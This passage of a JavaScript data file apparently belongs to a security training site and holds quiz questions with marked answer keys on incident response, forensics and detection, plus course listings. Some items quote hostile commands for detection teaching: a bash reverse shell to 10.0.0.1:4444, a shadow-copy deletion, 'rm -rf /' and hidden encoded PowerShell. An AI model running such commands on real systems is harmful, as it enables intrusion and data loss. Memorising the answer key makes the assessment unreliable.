              { id: 'f_opt_11_b', text: 'Lateral Movement (TA0008)', is_correct: false },
              { id: 'f_opt_11_c', text: 'Persistence (TA0003)', is_correct: true },
              { id: 'f_opt_11_d', text: 'Exfiltration (TA0010)', is_correct: false }
            ],
            explanation: 'Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions.'
          },
          {
            id: 'fe_12',
            text: 'What does a sudden surge of Windows Event ID 4625 followed immediately by Event ID 4624 for the same user account from a single source workstation indicate?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_12_a', text: 'Active Directory Database Corruption', is_correct: false },
              { id: 'f_opt_12_b', text: 'DDoS SYN Flood on Domain Controller port 88', is_correct: false },
              { id: 'f_opt_12_c', text: 'A user successfully resetting their PIN via Self-Service Portal', is_correct: false },
              { id: 'f_opt_12_d', text: 'Successful Password Spray or Brute Force Attack', is_correct: true }
            ],
            explanation: 'Event ID 4625 denotes failed logon attempts. Multiple failures followed by a single 4624 (successful logon) from the same source is the hallmark of brute-force or dictionary cracking.'
          },
          {
            id: 'fe_13',
            text: 'In Snort/Suricata signature development, what does the \'content\' modifier \'nocase; offset:0; depth:4;\' accomplish when matching a packet payload?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_13_a', text: 'Searches case-insensitively across the first 4 bytes of the payload payload buffer starting from offset 0', is_correct: true },
              { id: 'f_opt_13_b', text: 'Skips the first 4 packets and ignores case on the TCP flags', is_correct: false },
              { id: 'f_opt_13_c', text: 'Encrypts the packet payload using a 4-byte XOR key', is_correct: false },
              { id: 'f_opt_13_d', text: 'Drops the packet if the payload length exceeds 4 bytes', is_correct: false }
            ],
            explanation: 'In Snort, offset defines where to start searching relative to payload start, depth specifies how many bytes to inspect, and nocase enforces case-insensitive comparison.'
          },
          {
            id: 'fe_14',
            text: 'What key forensic artifact in the Windows Registry records the execution timestamp and launch count of GUI programs run by interactive users?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_14_a', text: 'HKLM\\SYSTEM\\CurrentControlSet\\Services', is_correct: false },
              { id: 'f_opt_14_b', text: 'UserAssist key in NTUSER.DAT (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist)', is_correct: true },
              { id: 'f_opt_14_c', text: 'HKLM\\SAM\\Domains\\Account\\Users', is_correct: false },
              { id: 'f_opt_14_d', text: 'HKLM\\HARDWARE\\DEVICEMAP', is_correct: false }
            ],
            explanation: 'The UserAssist registry key uses ROT13 encoding to log executable launches, execution counts, and last execution timestamps for applications initiated via Windows Explorer.'
          },
          {
            id: 'fe_15',
            text: 'Which command line syntax executes a volume shadow copy deletion commonly observed in Ransomware kill-chains (MITRE T1490)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_15_a', text: 'cipher /w:C:\\', is_correct: false },
              { id: 'f_opt_15_b', text: 'diskpart /clean /all', is_correct: false },
              { id: 'f_opt_15_c', text: 'vssadmin.exe delete shadows /all /quiet', is_correct: true },
              { id: 'f_opt_15_d', text: 'chkdsk C: /f /r', is_correct: false }
            ],
            explanation: 'vssadmin.exe delete shadows /all /quiet is the classic command used by ransomware operators to inhibit system recovery prior to encrypting storage volumes.'
          },
          {
            id: 'fe_16',
            text: 'In Linux auditd logs, what does a \'type=EXECVE\' entry containing \'argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/10.0.0.1/4444 0>&1"\' reveal?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_16_a', text: 'A routine system administrative backup routine over NFS', is_correct: false },
              { id: 'f_opt_16_b', text: 'A corrupted DNS cache lookup loop', is_correct: false },
              { id: 'f_opt_16_c', text: 'A package update installation via apt-get', is_correct: false },
              { id: 'f_opt_16_d', text: 'An interactive Bash reverse shell established to remote IP 10.0.0.1 on port 4444', is_correct: true }
            ],
            explanation: 'bash -i >& /dev/tcp/ip/port 0>&1 redirects stdin, stdout, and stderr to a network socket, establishing an interactive TCP reverse shell.'
          },
          {
            id: 'fe_17',
            text: 'What critical security measure prevents NTLM relay attacks against Active Directory Certificate Services (AD CS / PetitPotam)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_17_a', text: 'Enforcing Extended Protection for Authentication (EPA) and requiring HTTPS on AD CS web enrollment interfaces', is_correct: true },
              { id: 'f_opt_17_b', text: 'Disabling DNS scavenging across domain zones', is_correct: false },
              { id: 'f_opt_17_c', text: 'Enabling SMBv1 on domain members', is_correct: false },
              { id: 'f_opt_17_d', text: 'Allowing anonymous LDAP binds', is_correct: false }
            ],
            explanation: 'EPA (Extended Protection for Authentication) and disabling HTTP endpoints or enforcing SSL channel binding prevents attackers from relaying captured NTLM auth to AD CS web endpoints.'
          },
          {
            id: 'fe_18',
            text: 'Which Sigma rule detection condition matches when EventID is 1 (Process Create) and the process command line contains both \'mimikatz\' and \'sekurlsa\' regardless of capitalization?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_18_a', text: 'selection1 and (selection2 or selection3)', is_correct: false },
              { id: 'f_opt_18_b', text: 'EventID: 1 and CommandLine|contains|all: [\'mimikatz\', \'sekurlsa\']', is_correct: true },
              { id: 'f_opt_18_c', text: 'EventID == 4688 and ProcessName != \'cmd.exe\'', is_correct: false },
              { id: 'f_opt_18_d', text: 'not (CommandLine == \'powershell.exe\')', is_correct: false }
            ],
            explanation: 'Sigma\'s CommandLine|contains|all modifier requires all listed substring items to exist within the target field, matching the command line pattern.'
          },
          {
            id: 'fe_19',
            text: 'What is the main utility of Shimcache (AppCompatCache) in Windows incident response triage?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_19_a', text: 'Determining the exact number of times a program was launched by every logged-in user', is_correct: false },
              { id: 'f_opt_19_b', text: 'Decrypting BitLocker volume encryption keys', is_correct: false },
              { id: 'f_opt_19_c', text: 'Proving that a specific executable binary was present on disk and executed by the operating system', is_correct: true },
              { id: 'f_opt_19_d', text: 'Recovering unencrypted SSL session keys from RAM', is_correct: false }
            ],
            explanation: 'Shimcache tracks application compatibility metadata. While it does not record user context or precise execution counts on modern Windows, it proves execution and file existence.'
          },
          {
            id: 'fe_20',
            text: 'Which HTTP response header explicitly prevents cross-origin data leaks by instructing modern browsers to block rendering within an <iframe>?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_20_a', text: 'Access-Control-Allow-Origin: *', is_correct: false },
              { id: 'f_opt_20_b', text: 'Strict-Transport-Security: max-age=31536000', is_correct: false },
              { id: 'f_opt_20_c', text: 'Server: Apache/2.4.41', is_correct: false },
              { id: 'f_opt_20_d', text: 'X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\'', is_correct: true }
            ],
            explanation: 'X-Frame-Options: DENY and CSP frame-ancestors prevent clickjacking by disallowing framing across any parent browsing context.'
          },
          {
            id: 'fe_21',
            text: 'During a network packet capture analysis, you notice TCP packets with SYN and FIN flags set simultaneously. What does this signify?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_21_a', text: 'An illegal/abnormal TCP flag combination commonly generated by port scanners (e.g. Nmap SYN/FIN scan) to evade naive stateful inspection', is_correct: true },
              { id: 'f_opt_21_b', text: 'Standard TCP keep-alive probe', is_correct: false },
              { id: 'f_opt_21_c', text: 'Normal HTTP/2 multi-stream multiplexing', is_correct: false },
              { id: 'f_opt_21_d', text: 'A gracefully closed BGP peering session', is_correct: false }
            ],
            explanation: 'SYN (synchronize) and FIN (finish) are mutually exclusive states in RFC 793. Their co-occurrence indicates scanner probing or firewall evasion attempts.'
          },
          {
            id: 'fe_22',
            text: 'What is the primary indicator of DLL Search Order Hijacking (T1574.001) in Sysmon Event ID 7 (Image Loaded) telemetry?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_22_a', text: 'A DLL loaded with signature status \'Microsoft Windows Verified\'', is_correct: false },
              { id: 'f_opt_22_b', text: 'A known system DLL (e.g. version.dll) loaded from a user-writable directory (e.g. AppData or Temp) rather than System32', is_correct: true },
              { id: 'f_opt_22_c', text: 'Any DLL smaller than 10 kilobytes', is_correct: false },
              { id: 'f_opt_22_d', text: 'Kernel drivers loaded during cold boot', is_correct: false }
            ],
            explanation: 'DLL hijacking relies on placing a malicious DLL in a directory prioritized before System32 in the search order, visible when system DLL names load from user-writable paths.'
          },
          {
            id: 'fe_23',
            text: 'Which memory structure in the Windows kernel holds pointers to loaded drivers, making it a critical target for rootkit DKOM (Direct Kernel Object Manipulation)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_23_a', text: 'MBR partition table', is_correct: false },
              { id: 'f_opt_23_b', text: 'BIOS CMOS RAM', is_correct: false },
              { id: 'f_opt_23_c', text: 'PsLoadedModuleList linked list', is_correct: true },
              { id: 'f_opt_23_d', text: 'Local Security Authority database file', is_correct: false }
            ],
            explanation: 'PsLoadedModuleList is a doubly-linked list of KLDR_DATA_TABLE_ENTRY structures. Rootkits unhook their node from this list to become invisible to standard driver enumerators.'
          },
          {
            id: 'fe_24',
            text: 'An incident responder finds that an attacker created an SSH key in /root/.ssh/authorized_keys with \'from="192.168.1.50"\'. What does this \'from\' directive enforce?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_24_a', text: 'Sends an email notification to that IP whenever the key is used', is_correct: false },
              { id: 'f_opt_24_b', text: 'Forces SSH traffic to be mirrored to 192.168.1.50 for monitoring', is_correct: false },
              { id: 'f_opt_24_c', text: 'Disables root login completely', is_correct: false },
              { id: 'f_opt_24_d', text: 'Restricts the use of this public key to logins originating strictly from the specified IP address 192.168.1.50', is_correct: true }
            ],
            explanation: 'In OpenSSH authorized_keys, the from="pattern" option restricts public key authentication exclusively to matching source IP addresses or hostnames.'
          },
          {
            id: 'fe_25',
            text: 'Which SIEM correlation query structure best detects a Kerberos Diamond Ticket attack, where the attacker uses a compromised Ticket Granting Service (TGS) request?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_25_a', text: 'Correlating Event ID 4768 (TGT Request) having genuine PAC signatures with subsequent Event ID 4769 (Service Ticket) requests featuring modified user SIDs', is_correct: true },
              { id: 'f_opt_25_b', text: 'Searching for Event ID 1102 log clearances on workstations', is_correct: false },
              { id: 'f_opt_25_c', text: 'Counting total ping ICMP packets on the perimeter router', is_correct: false },
              { id: 'f_opt_25_d', text: 'Filtering for DHCP lease expirations', is_correct: false }
            ],
            explanation: 'Diamond Ticket attacks request a legitimate TGT from the KDC and modify the PAC using the krbtgt key, differing from Golden Tickets which generate TGTs without prior 4768 events.'
          },
          {
            id: 'fe_26',
            text: 'In web application security, how does an attacker exploit an Insecure Deserialization vulnerability in Java (e.g. Apache Commons Collections)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_26_a', text: 'By sending a SQL query with 1=1 in the URL parameter', is_correct: false },
              { id: 'f_opt_26_b', text: 'By submitting craftily serialized object gadget chains that invoke arbitrary method execution upon readObject() deserialization', is_correct: true },
              { id: 'f_opt_26_c', text: 'By overloading the web server with 50,000 concurrent HTTP GET requests', is_correct: false },
              { id: 'f_opt_26_d', text: 'By modifying the User-Agent header to \'curl\'', is_correct: false }
            ],
            explanation: 'Java deserialization vulnerabilities exploit gadget chains where custom readObject() implementations invoke reflective calls (InvokerTransformer, TemplatesImpl) leading to RCE.'
          },
          {
            id: 'fe_27',
            text: 'What does the presence of the string \'$Recycle.Bin\' combined with an alternate data stream (e.g. \':Zone.Identifier\') in NTFS metadata reveal?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_27_a', text: 'The user\'s browser bookmarks', is_correct: false },
              { id: 'f_opt_27_b', text: 'The hard drive serial number', is_correct: false },
              { id: 'f_opt_27_c', text: 'The security zone and URL origin from which a deleted file was originally downloaded from the Internet', is_correct: true },
              { id: 'f_opt_27_d', text: 'A corrupted master file table (MFT) record', is_correct: false }
            ],
            explanation: 'Zone.Identifier is an NTFS Alternate Data Stream (ADS) appended by browsers (Mark of the Web / MOTW). If the file is moved to the Recycle Bin, this stream preserves the source URL.'
          },
          {
            id: 'fe_28',
            text: 'Which Linux command lists all processes that have deleted files still mapped open in memory, frequently used to identify concealed malware?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_28_a', text: 'ls -la /tmp', is_correct: false },
              { id: 'f_opt_28_b', text: 'df -h', is_correct: false },
              { id: 'f_opt_28_c', text: 'uname -r', is_correct: false },
              { id: 'f_opt_28_d', text: 'lsof +L1 or lsof | grep deleted', is_correct: true }
            ],
            explanation: 'lsof +L1 identifies open files with a link count of zero (files unlinked from the filesystem but still kept alive in memory by running processes).'
          },
          {
            id: 'fe_29',
            text: 'What is the cryptographic danger of using static Initialization Vectors (IV) with AES in CBC mode across multiple messages?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_29_a', text: 'Identical plaintext prefixes produce identical initial ciphertext blocks, enabling chosen-plaintext and dictionary reconstruction attacks', is_correct: true },
              { id: 'f_opt_29_b', text: 'The private key is leaked in the TCP window field', is_correct: false },
              { id: 'f_opt_29_c', text: 'The data transmission rate decreases by 50%', is_correct: false },
              { id: 'f_opt_29_d', text: 'It causes the operating system kernel to crash', is_correct: false }
            ],
            explanation: 'CBC mode requires unpredictable, unique IVs per encryption. Reusing an IV reveals whether two plaintexts share the same initial block sequence.'
          },
          {
            id: 'fe_30',
            text: 'During an investigation into lateral movement, you analyze Windows Security Event ID 4648. What does this event represent?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_30_a', text: 'A user account was locked out by the domain controller', is_correct: false },
              { id: 'f_opt_30_b', text: 'A logon was attempted using explicit credentials (e.g. runas.exe or tools passing explicit credentials across the network)', is_correct: true },
              { id: 'f_opt_30_c', text: 'A Kerberos ticket was renewed automatically', is_correct: false },
              { id: 'f_opt_30_d', text: 'An audit log was exported to an external drive', is_correct: false }
            ],
            explanation: 'Event ID 4648 logs whenever a process attempts to log on an account by explicitly specifying that account\'s credentials (e.g. runas or automated administrative scripts).'
          },
          {
            id: 'fe_31',
            text: 'Which Windows Defender feature isolates untrusted applications and Office attachments within a temporary hardware-isolated Hyper-V microVM?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_31_a', text: 'BitLocker Drive Encryption', is_correct: false },
              { id: 'f_opt_31_b', text: 'Windows Disk Cleanup', is_correct: false },
              { id: 'f_opt_31_c', text: 'Microsoft Defender Application Guard (MDAG)', is_correct: true },
              { id: 'f_opt_31_d', text: 'Network Address Translation', is_correct: false }
            ],
            explanation: 'MDAG (Application Guard) uses container technology and Hyper-V isolation to open untrusted documents and web pages in an ephemeral microVM separate from the host OS.'
          },
          {
            id: 'fe_32',
            text: 'What does the \'SRV\' record in DNS resolve for Active Directory clients during domain controller discovery?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_32_a', text: 'The reverse lookup PTR for external web servers', is_correct: false },
              { id: 'f_opt_32_b', text: 'The mail exchanger priority for spam filtering', is_correct: false },
              { id: 'f_opt_32_c', text: 'The public SSH host key fingerprint', is_correct: false },
              { id: 'f_opt_32_d', text: 'The IP address and port of specific services such as LDAP (_ldap._tcp) and Kerberos (_kerberos._tcp) available within the domain', is_correct: true }
            ],
            explanation: 'SRV records provide location data (hostname and port) for AD domain services like LDAP (_ldap._tcp.dc._msdcs.domain) and Kerberos.'
          },
          {
            id: 'fe_33',
            text: 'Which memory injection technique overwrites the address of a function in the Global Offset Table (GOT) of a running ELF binary on Linux?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_33_a', text: 'GOT Overwrite / PLT Hijacking', is_correct: true },
              { id: 'f_opt_33_b', text: 'DLL Side-Loading', is_correct: false },
              { id: 'f_opt_33_c', text: 'COM Hijacking', is_correct: false },
              { id: 'f_opt_33_d', text: 'AppInit_DLLs injection', is_correct: false }
            ],
            explanation: 'In dynamically linked ELF binaries without Full RELRO, the Global Offset Table (GOT) holds resolved libc addresses. Overwriting GOT entries hijacks execution.'
          },
          {
            id: 'fe_34',
            text: 'An attacker leverages the \'printnightmare\' vulnerability (CVE-2021-34527). Which Windows service must be disabled or restricted to mitigate this exploit?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_34_a', text: 'Windows Audio service', is_correct: false },
              { id: 'f_opt_34_b', text: 'Print Spooler (spoolsv.exe)', is_correct: true },
              { id: 'f_opt_34_c', text: 'Remote Desktop Services', is_correct: false },
              { id: 'f_opt_34_d', text: 'Windows Time (W32Time)', is_correct: false }
            ],
            explanation: 'PrintNightmare flaws in the Windows Print Spooler (spoolsv.exe) allow remote code execution and local privilege escalation via RpcAddPrinterDriverEx.'
          },
          {
            id: 'fe_35',
            text: 'Which specific file format stores the forensic contents of the Windows Registry transaction logs used to repair dirty hive states?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_35_a', text: '.EVTX files', is_correct: false },
              { id: 'f_opt_35_b', text: '.PDB symbol databases', is_correct: false },
              { id: 'f_opt_35_c', text: '.LOG1 and .LOG2 transaction logs', is_correct: true },
              { id: 'f_opt_35_d', text: '.TMP cache files', is_correct: false }
            ],
            explanation: 'Windows Registry hives use write-ahead logging (.LOG1, .LOG2). Forensic tools replay transaction logs to reconstruct recent changes not yet flushed to the main hive.'
          },
          {
            id: 'fe_36',
            text: 'When triaging an AWS environment after a suspected credential compromise, which CloudTrail event indicates an adversary attempting to determine their effective IAM permissions?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_36_a', text: 's3:ListAllMyBuckets', is_correct: false },
              { id: 'f_opt_36_b', text: 'ec2:DescribeInstances', is_correct: false },
              { id: 'f_opt_36_c', text: 'iam:ChangePassword', is_correct: false },
              { id: 'f_opt_36_d', text: 'sts:GetCallerIdentity', is_correct: true }
            ],
            explanation: 'sts:GetCallerIdentity is the universal reconnaissance call used by attackers to check the account ID, ARN, and IAM user/role associated with stolen AWS access keys.'
          },
          {
            id: 'fe_37',
            text: 'What does the presence of an unexpected scheduled task executing \'powershell -w hidden -nop -enc ...\' via Schtasks.exe represent?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_37_a', text: 'MITRE ATT&CK T1053.005 Scheduled Task persistence mechanism with execution evasion flags', is_correct: true },
              { id: 'f_opt_37_b', text: 'Standard Windows Update telemetry collector', is_correct: false },
              { id: 'f_opt_37_c', text: 'Hard disk fragmentation defrag task', is_correct: false },
              { id: 'f_opt_37_d', text: 'A clean system restore point creation', is_correct: false }
            ],
            explanation: 'Adversaries weaponize schtasks to schedule hidden, non-interactive encoded PowerShell scripts for persistence and automated re-entry.'
          },
          {
            id: 'fe_38',
            text: 'Which Snort keyword ensures that an alert triggers only after a predefined threshold of packets matching the rule is reached within a set time window?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_38_a', text: 'rev:1', is_correct: false },
              { id: 'f_opt_38_b', text: 'threshold: type limit, track by_src, count 10, seconds 60', is_correct: true },
              { id: 'f_opt_38_c', text: 'classtype:bad-unknown', is_correct: false },
              { id: 'f_opt_38_d', text: 'sid:100001', is_correct: false }
            ],
            explanation: 'Snort threshold options manage event suppression, tracking by source or destination IP, counting occurrences within an interval to reduce alarm fatigue.'
          },
          {
            id: 'fe_39',
            text: 'What does an analyst deduce when a binary\'s import address table (IAT) contains only LoadLibrary and GetProcAddress, with high file entropy (> 7.5)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_39_a', text: 'The binary is a standard .NET managed executable', is_correct: false },
              { id: 'f_opt_39_b', text: 'The file has zero security risk and is completely safe', is_correct: false },
              { id: 'f_opt_39_c', text: 'The binary is almost certainly packed or encrypted to evade static signature analysis', is_correct: true },
              { id: 'f_opt_39_d', text: 'The program was compiled with MS-DOS 6.22', is_correct: false }
            ],
            explanation: 'A minimal IAT (LoadLibrary/GetProcAddress only) combined with high Shannon entropy (>7.2) is the canonical indicator of packed or encrypted malicious binaries.'
          },
          {
            id: 'fe_40',
            text: 'Which Sysinternals tool allows an incident responder to view active handles, locked DLLs, and open files associated with any running Windows process?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_40_a', text: 'TCPView only', is_correct: false },
              { id: 'f_opt_40_b', text: 'BgInfo.exe', is_correct: false },
              { id: 'f_opt_40_c', text: 'ZoomIt.exe', is_correct: false },
              { id: 'f_opt_40_d', text: 'Handle.exe or Process Explorer (Ctrl+H / Ctrl+D)', is_correct: true }
            ],
            explanation: 'Sysinternals Handle and Process Explorer display all open kernel object handles, registry keys, and mapped DLLs held by active processes.'
          },
          {
            id: 'fe_41',
            text: 'What is the primary indicator of an adversary performing DCSync (T1003.006) in network telemetry?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_41_a', text: 'MS-DRSR (Directory Replication Service Remote Protocol) DsGetNCChanges RPC requests originating from a non-Domain Controller host', is_correct: true },
              { id: 'f_opt_41_b', text: 'High volume of ICMP echo requests to the firewall', is_correct: false },
              { id: 'f_opt_41_c', text: 'FTP file downloads over port 21', is_correct: false },
              { id: 'f_opt_41_d', text: 'SNMP trap notifications to port 162', is_correct: false }
            ],
            explanation: 'DCSync pretends to be a domain controller requesting synchronization (DsGetNCChanges). Detecting this replication RPC call from a non-DC workstation catches the attack.'
          },
          {
            id: 'fe_42',
            text: 'In the context of the MITRE D3FEND defensive knowledge graph, which defensive technique counters \'Process Injection: Dynamic-link Library Injection\'?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_42_a', text: 'User Account Lockout', is_correct: false },
              { id: 'f_opt_42_b', text: 'Process Spawn Analysis (D3-PSA) and Dynamic API Monitoring', is_correct: true },
              { id: 'f_opt_42_c', text: 'Disk Defragmentation', is_correct: false },
              { id: 'f_opt_42_d', text: 'Email DKIM signing', is_correct: false }
            ],
            explanation: 'D3FEND maps countermeasures against offensive techniques. Process Spawn Analysis and Dynamic API Monitoring intercept and flag unauthorized injection vectors.'
          },
          {
            id: 'fe_43',
            text: 'What does a sudden spike in DNS queries for domains resolving to 127.0.0.1 or 0.0.0.0 often indicate in enterprise network monitoring?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_43_a', text: 'A malfunctioning network gateway router', is_correct: false },
              { id: 'f_opt_43_b', text: 'Adversary exfiltrating gigabytes of data over UDP', is_correct: false },
              { id: 'f_opt_43_c', text: 'DNS Sinkholing successfully redirecting malicious C2 beacon traffic to a local loopback address', is_correct: true },
              { id: 'f_opt_43_d', text: 'A corrupted Windows hosts file entry on the DNS server itself', is_correct: false }
            ],
            explanation: 'DNS Sinkholing intercepts requests for known malicious domains and responds with a safe address (such as 127.0.0.1 or a dedicated analysis sinkhole).'
          },
          {
            id: 'fe_44',
            text: 'Which Windows Security Event ID tracks whenever an access mask granting Full Control or Write permissions is added to a Discretionary Access Control List (DACL)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_44_a', text: 'Event ID 4624 (Logon success)', is_correct: false },
              { id: 'f_opt_44_b', text: 'Event ID 4738 (A user account was modified)', is_correct: false },
              { id: 'f_opt_44_c', text: 'Event ID 1100 (Eventlog service shutdown)', is_correct: false },
              { id: 'f_opt_44_d', text: 'Event ID 4670 (Permissions on an object were changed)', is_correct: true }
            ],
            explanation: 'Event ID 4670 records changes to object DACLs, logging the original and new security descriptors, critical for detecting privilege escalation via ACL abuse.'
          },
          {
            id: 'fe_45',
            text: 'How does an incident response team safely contain a compromised Linux virtual machine without losing volatile RAM state?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_45_a', text: 'Isolate the VM\'s virtual NIC in a quarantined VLAN or apply host iptables drop rules while leaving the VM running to dump memory via LiME or hypervisor snapshot', is_correct: true },
              { id: 'f_opt_45_b', text: 'Unplug the physical power cord from the server chassis immediately', is_correct: false },
              { id: 'f_opt_45_c', text: 'Issue \'rm -rf /\' to destroy attacker files', is_correct: false },
              { id: 'f_opt_45_d', text: 'Restart the server in Single-User Rescue Mode', is_correct: false }
            ],
            explanation: 'Cutting power or rebooting destroys volatile memory. Network isolation (or hypervisor snapshot) halts lateral movement while preserving the volatile RAM state for forensication.'
          },
          {
            id: 'fe_46',
            text: 'What is the purpose of the \'Golden SAML\' attack in federated cloud identity architectures (e.g. Okta / Azure AD)?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_46_a', text: 'Cracking NTLM passwords using dictionary wordlists', is_correct: false },
              { id: 'f_opt_46_b', text: 'Stealing the private token-signing certificate of the Active Directory Federation Services (AD FS) to forge SAML assertions as any user with arbitrary roles', is_correct: true },
              { id: 'f_opt_46_c', text: 'Overloading SAML endpoints with spoofed XML packets', is_correct: false },
              { id: 'f_opt_46_d', text: 'Bypassing multi-factor authentication via SMS interception', is_correct: false }
            ],
            explanation: 'Golden SAML requires compromising the AD FS token-signing certificate, allowing the attacker to mint valid SAML assertions for any cloud identity without needing user passwords.'
          },
          {
            id: 'fe_47',
            text: 'Which registry hive contains the \'Run\' and \'RunOnce\' keys used by adversaries for user-level persistence upon interactive logon?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_47_a', text: 'HKLM\\BCD00000000', is_correct: false },
              { id: 'f_opt_47_b', text: 'HKCR\\CLSID', is_correct: false },
              { id: 'f_opt_47_c', text: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', is_correct: true },
              { id: 'f_opt_47_d', text: 'HKU\\.DEFAULT\\Control Panel', is_correct: false }
            ],
            explanation: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run executes binaries automatically whenever that specific user logs in, requiring no administrative privileges.'
          },
          {
            id: 'fe_48',
            text: 'What does a high ratio of TCP RST packets originating from an internal server toward external internet hosts generally signify in SOC egress telemetry?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_48_a', text: 'Standard NTP time synchronization', is_correct: false },
              { id: 'f_opt_48_b', text: 'Routine Windows Update downloads', is_correct: false },
              { id: 'f_opt_48_c', text: 'A healthy gigabit fiber connection', is_correct: false },
              { id: 'f_opt_48_d', text: 'Malware attempting widespread outbound port scanning or C2 connections where ports are closed or firewalled', is_correct: true }
            ],
            explanation: 'Massive outbound RST packets indicate connection aborts, common when malware sweeps ranges of closed IP/ports during automated propagation or dead C2 failover.'
          },
          {
            id: 'fe_49',
            text: 'Which utility from the Volatility 3 framework extracts injected VAD (Virtual Address Descriptor) memory sections that have PAGE_EXECUTE_READWRITE permissions?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_49_a', text: 'windows.malfind.Malfind', is_correct: true },
              { id: 'f_opt_49_b', text: 'windows.info.Info', is_correct: false },
              { id: 'f_opt_49_c', text: 'windows.netscan.NetScan', is_correct: false },
              { id: 'f_opt_49_d', text: 'windows.pstree.PsTree', is_correct: false }
            ],
            explanation: 'Volatility\'s malfind plugin scans VAD nodes looking for memory regions marked executable and writable (PAGE_EXECUTE_READWRITE) that are not backed by a file on disk.'
          },
          {
            id: 'fe_50',
            text: 'Under the NIST SP 800-61r2 Computer Security Incident Handling Guide, what is the required first action following the successful containment of an active enterprise intrusion?',
            type: 'single_choice',
            points: 2,
            options: [
              { id: 'f_opt_50_a', text: 'Immediately restore production systems without changing passwords', is_correct: false },
              { id: 'f_opt_50_b', text: 'Eradication: Identify and eliminate all components of the incident, including deleting malware and closing breached user accounts', is_correct: true },
              { id: 'f_opt_50_c', text: 'Publish a public press release before alerting executive leadership', is_correct: false },
              { id: 'f_opt_50_d', text: 'Reboot all domain controllers in safe mode simultaneously', is_correct: false }
            ],
            explanation: 'NIST incident response lifecycle proceeds from Containment directly to Eradication (eliminating threat artifacts, rootkits, persistence hooks) prior to Recovery and Lessons Learned.'
          }
      ]
    }
    },
  {
    id: 'crs_cyber_fund',
    slug: 'cybersecurity-fundamentals',
    title: 'Cybersecurity Fundamentals & Defensive Architecture',
    version: '1.0',
    category: 'Foundation',
    difficulty: 'Beginner',
    card_variant: 'variant-03',
    art: '/assets/course-art/art-03.jpg',
    artPos: '75% 30%',
    estimated_weeks: 6,
    milestone_cert: 'Cyber Defense Foundation Credential',
    skills: ["CIA Triad & Defense","Threat Modeling","Identity & Access","Perimeter Hardening"],
    price: 0,
    cert_price: 1999,
    estimated_duration: '8 Hours',
    rating: 4.8,
    enrolled_count: 2890,
    lead_author: {
      name: 'David Reynolds',
      title: 'Senior Defensive Architect, RedKross',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Core foundational principles: Confidentiality, Integrity, and Availability (CIA), threat modeling, zero trust architecture, and safe security operations hygiene.',
    learning_objectives: ['Understand CIA triad and defence-in-depth', 'Threat modeling with STRIDE', 'Basic encryption principles'],
    prerequisites: ['None'],
    total_tokens_reward: 250,
    modules: []
  },
  {
    id: 'crs_linux_fund',
    slug: 'linux-fundamentals-for-defenders',
    title: 'Linux Fundamentals for Security Operations',
    version: '1.1',
    category: 'Technical',
    difficulty: 'Beginner',
    card_variant: 'variant-05',
    art: '/assets/course-art/art-05.jpg',
    artPos: '75% 32%',
    estimated_weeks: 6,
    milestone_cert: 'Linux Security Operator Credential',
    skills: ["Bash Scripting","Auditd & Syslog","SUID & Permissions","Process Telemetry"],
    price: 0,
    cert_price: 1999,
    estimated_duration: '10 Hours',
    rating: 4.9,
    enrolled_count: 1940,
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Defensive Linux administration: command line fluency, permission bits, /proc filesystem exploration, systemd service forensics, and auditd log analysis.',
